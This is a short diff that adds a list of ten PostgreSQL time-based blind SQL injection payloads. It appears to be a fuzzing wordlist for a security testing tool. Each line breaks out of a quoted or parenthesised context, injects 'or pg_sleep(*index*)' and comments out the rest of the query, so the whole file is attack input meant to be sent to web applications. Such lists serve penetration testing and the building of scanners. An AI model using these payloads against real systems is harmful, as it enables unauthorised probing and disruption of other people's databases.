@@ -1,0 +1,10 @@
+pg_sleep(*index*)--
+1 or pg_sleep(*index*)--
+" or pg_sleep(*index*)--
+' or pg_sleep(*index*)--
+1) or pg_sleep(*index*)--
+") or pg_sleep(*index*)--
+') or pg_sleep(*index*)--
+1)) or pg_sleep(*index*)--
+")) or pg_sleep(*index*)--
+')) or pg_sleep(*index*)--
